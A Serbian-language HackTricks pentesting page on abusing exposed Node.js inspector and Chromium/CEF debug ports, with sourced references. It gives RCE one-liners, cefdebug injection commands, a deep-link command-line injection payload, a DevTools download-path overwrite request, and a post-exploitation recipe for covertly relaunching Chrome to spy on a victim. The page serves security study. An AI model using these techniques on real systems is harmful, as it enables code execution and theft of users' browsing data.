# Zloupotreba Node inspector/CEF debug-a

{{#include ../../banners/hacktricks-training.md}}

Istorijski praktični primeri obuhvataju Multimaster walkthrough i CVE-2019-1414 Visual Studio Code debugger attack; koristite ih kao kontekst specifičan za određenu verziju, umesto pretpostavke da svaki trenutni Electron ili Chromium target izlaže iste primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Osnovne informacije

[Prema dokumentaciji](https://nodejs.org/learn/getting-started/debugging): Kada se pokrene sa `--inspect` switch-om, Node.js proces osluškuje debugging client. **Podrazumevano**, osluškivaće na hostu i portu **`127.0.0.1:9229`**. Svakom procesu se takođe dodeljuje **jedinstveni** **UUID**.<sup>[[4]](#references)</sup>

Inspector clients moraju znati i navesti adresu hosta, port i UUID da bi se povezali. Puna URL adresa izgleda otprilike ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Pošto **debugger ima potpun pristup Node.js execution environment-u**, malicious actor koji može da se poveže na ovaj port možda može da izvršava proizvoljan kod u ime Node.js procesa (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Postoji nekoliko načina za pokretanje inspector-a:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kada pokrenete proces koji se ispituje, pojaviće se nešto poput ovoga:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) mogu izložiti debugger sa `--remote-debugging-port=9222`. Ovo izlaže browser preko [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) umesto Node.js inspectora, pa Node.js payload-i zasnovani na `process` podrazumevano nisu direktno primenljivi.<sup>[[2]](#references)[[5]](#references)</sup>

Kada pokrenete browser sa omogućenim debugging-om, pojaviće se nešto poput sledećeg:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browseri, WebSockets i same-origin-policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Veb-sajtovi otvoreni u web-browseru mogu da šalju WebSocket i HTTP zahteve u okviru browser security modela. **Početna HTTP konekcija** je neophodna za **dobijanje jedinstvenog ID-ja debugger sesije**. **Same-origin-policy** **sprečava** veb-sajtove da uspostave **ovu HTTP konekciju**. Kao dodatnu zaštitu od [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da **'Host' headers** za konekciju navode ili **IP adresu** ili precizno **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ova **security measure sprečava iskorišćavanje inspectora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo da se uradi iskorišćavanjem SSRF ranjivosti).<sup>[[4]](#references)</sup>

### Pokretanje inspectora u pokrenutim procesima

Možete poslati **signal SIGUSR1** pokrenutom nodejs procesu da biste omogućili da **pokrene inspector** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljno privilegija, pa vam ovo može omogućiti **privilegovani pristup informacijama unutar procesa**, ali ne i direktnu eskalaciju privilegija.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Ovo je korisno u kontejnerima zato što **gašenje procesa i pokretanje novog** sa `--inspect` **nije opcija**, jer će **kontejner** biti **prekinut** zajedno sa procesom.<sup>[[6]](#references)</sup>

### Povezivanje sa inspector/debugger

Za povezivanje sa **Chromium-based browserom**, URL-ovi `chrome://inspect` ili `edge://inspect` mogu se otvoriti za Chrome odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Nakon URL-a za pristup debuggeru pojaviće se, npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debugger: Za povezivanje sa Chromium-based browserom,...](<../../images/image (674).png>)

Korišćenjem **command line-a** možete se povezati sa debuggerom/inspectorom pomoću:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava da **pronađe inspectors** koji rade lokalno i da u njih **inject code**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Imajte na umu da **NodeJS RCE exploit-i neće raditi** ako ste povezani sa browser-om putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (potrebno je proveriti API da biste pronašli zanimljive načine njegove upotrebe).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE u NodeJS Debugger/Inspector-u

> [!TIP]
> Ako ste ovde došli tražeći način da dobijete [**RCE putem XSS-a u Electron-u, pogledajte ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Neki uobičajeni načini za dobijanje **RCE-a** kada možete da se **povežete** sa Node **inspector-om** jesu korišćenje nečega poput sledećeg (izgleda da ovo **neće raditi pri povezivanju sa Chrome DevTools protocol-om**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payload-i Chrome DevTools Protocol-a

API možete proveriti ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
U ovom odeljku ću samo navesti zanimljive stvari za koje sam pronašao da su ih ljudi koristili za eksploataciju ovog protokola.

### Injection parametara putem Deep Links

U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kompanija Rhino Security otkrila je da je aplikacija zasnovana na CEF-u u sistemu **registrovala prilagođeni UR**I (workspaces://index.html), koji je primio ceo URI, a zatim **pokrenula aplikaciju zasnovanu na CEF-u** sa konfiguracijom koja je delimično konstruisana na osnovu tog URI-ja.<sup>[[8]](#references)</sup>

Otkriveno je da su parametri URI-ja URL decoded i korišćeni za pokretanje osnovne CEF aplikacije, što je korisniku omogućilo da **ubaci** flag **`--gpu-launcher`** u **command line** i izvršava proizvoljne radnje.<sup>[[8]](#references)</sup>

Dakle, payload kao što je:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Izvršiće calc.exe.<sup>[[8]](#references)</sup>

### Prepisivanje datoteka

Promenite fasciklu u kojoj će se **sačuvati preuzete datoteke** i preuzmite datoteku kako biste **prepisali** često korišćeni **source code** aplikacije svojim **malicious code**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### WebDriver RCE i exfiltracija

STAR Labs je pokazao da izloženi WebDriver/CDP servisi mogu omogućiti proizvoljno čitanje datoteka i RCE; DNS rebinding u nekim konfiguracijama može dovršiti exploit chain.<sup>[[9]](#references)</sup>

Za dodatne istorijske slučajeve browser automation-a i Chromium security-ja pogledajte Counter WebDriver write-up i Project Zero probleme 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

U stvarnom okruženju i **nakon kompromitovanja** korisničkog računara koji koristi browser zasnovan na Chrome/Chromium-u, mogli biste pokrenuti Chrome process sa **aktiviranim debugging-om i proslediti debugging port** kako biste mu pristupili. Na ovaj način moći ćete da **nadgledate sve što žrtva radi u Chrome-u i ukradete osetljive informacije**.<sup>[[7]](#references)</sup>

Stealth način je da **terminirate svaki Chrome process**, a zatim pozovete nešto poput:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - alat za inspekciju i eksploataciju CEF/Chromium debugger-a](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution u Visual Studio Code-u putem Chrome DevTools Debugger-a](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Vodič za debugging Node.js-a - Početak rada](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Zloupotreba Chrome-ove debugging funkcije za daljinsko posmatranje i kontrolu browsing sesija](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE putem DNS Rebinding-a i CDP-a (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Od bot-a do RCE-a](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
